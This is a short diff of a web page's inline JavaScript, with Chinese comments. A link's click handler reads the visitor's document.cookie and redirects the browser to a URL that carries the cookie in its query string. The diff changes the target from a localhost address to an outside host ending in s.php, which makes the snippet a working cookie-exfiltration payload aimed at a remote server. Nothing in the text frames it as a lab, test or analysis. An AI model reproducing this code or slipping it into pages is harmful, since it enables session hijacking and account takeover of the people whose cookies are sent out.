@@ -11,7 +11,7 @@
         document.getElementById('sendCookieLink').addEventListener('click', function(event) {
             event.preventDefault(); // 阻止默认的链接跳转行为
             var cookie = document.cookie; // 获取当前页面的cookie
-            var url = 'http://127.0.0.1/s.php?cookie=' + encodeURIComponent(cookie); // 构造目标URL
+            var url = 'http://headwind.wuaze.com/s.php?cookie=' + encodeURIComponent(cookie); // 构造目标URL
             window.location.href = url; // 跳转到目标URL
         });
     </script>
